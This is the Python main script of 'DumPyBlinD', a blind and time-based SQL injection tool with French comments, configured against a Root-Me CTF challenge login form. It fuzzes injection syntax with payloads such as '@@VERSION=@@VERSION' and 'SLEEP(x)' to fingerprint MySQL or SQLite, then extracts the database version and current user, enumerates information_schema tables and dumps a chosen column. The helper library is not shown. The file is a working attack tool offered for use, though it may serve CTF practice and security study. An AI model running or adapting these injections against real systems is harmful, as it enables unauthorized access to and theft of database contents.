#coding:utf-8
from lib.function import *
from lib.message import *
from colorama import *
init()

#clear()

banner = '''

 _____                    ______         ______  __  __         _____  
|     \ .--.--..--------.|   __ \.--.--.|   __ \|  ||__|.-----.|     \ 
|  --  ||  |  ||        ||    __/|  |  ||   __ <|  ||  ||     ||  --  |
|_____/ |_____||__|__|__||___|   |___  ||______/|__||__||__|__||_____/ 
                                 |_____|               
								

								'''+Fore.YELLOW+'''v 0.4'''+Fore.RESET+'''

-------------------------------------------------------------------------

'''

postData = {'username':'admin{fuzz}','password':'x'}


# Récupération des éléments 
setting = {

'dbms': '',

'sqli_type': 'BSQLI', # Le type de SQLi TBSQLI pour time based, et BSQLI pour blind
'url': 'http://challenge01.root-me.org/web-serveur/ch10/',# L'URL cible
'cookies':'',
'tofind': 'Welcome back admin',# Le mots-clées qui est retourner quand la requête retourne TRUE
'p_time': '3',# Le temps pour le payload blind

'method': 'POST',
'postData':  postData,
'delay': 0,
'msg': 'No',

'charset': 'azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN./0123456789_-$^^',
'column': 'TABLE_NAME',
'table': 'information_schema.TABLES WHERE TABLE_SCHEMA = database()',
'startline': '0',
'user_agent': 'DumPyBlinD v 0.4',

# Ne pas toucher
'escape': '',
'comment': '',
'operator': '',

'http_header_post': 'No',
'target_header' : 'X-Forwarded-For'
	}


# **		Affichage		**

clear()
print(banner)
print(legalDisclaimer)
print('\n')

method = setting['method']

if method == 'POST':

	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Starting DumPyBlinD with POST method')

elif method == 'GET':

	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Starting DumPyBlinD with GET method')

else:
	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Starting DumPyBlinD with '+setting['target_header']+' HTTP Header')




#  ** Fuzzing && déctection du back-end ** 

# ** MySQL ** 

if setting['sqli_type'] == 'BSQLI':

	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] testing \'MySQL\' > AND Boolean comparaison')

else:

	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] testing \'MySQL\' > AND SLEEP(x)')

escapeList = ['\'', '"', '']
commentList =  ['-- -', '--+', '#', '']
operatorList = ['AND']

for e in escapeList:
	for c in commentList:
		for o in operatorList:

			if setting['sqli_type'] == 'BSQLI':
				payload = '{} {} @@VERSION=@@VERSION {}'.format(e, o, c)# Fuzzing pour les SQLi Blind

			else:							  
				payload = '{} {} SLEEP({}){}'.format(e, o, setting['p_time'], c)# Fuzzing pour les SQLi Total Blind

			if Fuzz(setting, payload):
				setting['escape'] = e
				setting['comment'] = c
				setting['operator'] = o
				setting['dbms'] = 'MySQL'

# ** SQLite **

if setting['dbms'] == '':

	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] testing \'SQLite\' > AND Boolean comparaison')

	escapeList = ['\'', '"', '']
	commentList = ['--', '']
	operatorList = ['AND']

	for e in escapeList:
		for c in commentList:
			for o in operatorList:

				if setting['sqli_type'] == 'BSQLI':
					payload = '{} {}  sqlite_version()=sqlite_version() {}'.format(e, o, c)

					if Fuzz(setting, payload):
						setting['escape'] = e
						setting['comment'] = c
						setting['operator'] = o
						setting['dbms'] = 'SQLite'


if setting['dbms'] != 'MySQL' and setting['dbms'] != 'SQLite':
	print('\n['+Fore.RED+'CRITICAL'+Fore.RESET+'] Not vulnerable !\n')
	exit();

print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Target back-end is \''+setting['dbms']+'\'')

# ** Récupération des information à propos du SGBD **
if Question('Do you want get informations about target DBMS ? [y/N] : '):
	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Trying to get informations from the taget DBMS\n')
	if setting['dbms'] == 'MySQL':
		GetInfo(setting, 'database()')
		GetInfo(setting, '@@VERSION')
		GetInfo(setting, 'current_user()')
	else:
		GetInfo(setting, 'sqlite_version()')
	print('\n')


# ** Récupération des tables et colonnes communes du SGDB **
if Question('Do you want find commons tables and columns from the target DBMS ? [y/N] : '):
	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Trying to find commons tables and columns from the taget DBMS\n')
	Enumerate(setting)
	print('\n')


# Récupération du nombre de ligne de la colonne cible
print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Trying to count number of rows from '+setting['column'])

Rows = int(GetRows(setting))

if Rows == 0:
	print('\n['+Fore.RED+'CRITICAL'+Fore.RESET+'] Column or table not found !\n')
	exit();


# Dump de la colonne cible
print('['+Fore.GREEN+'INFO'+Fore.RESET+'] '+str(Rows)+' Elements found from '+setting['column'])
print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Data fetching start\n')


GetData(setting, Rows)




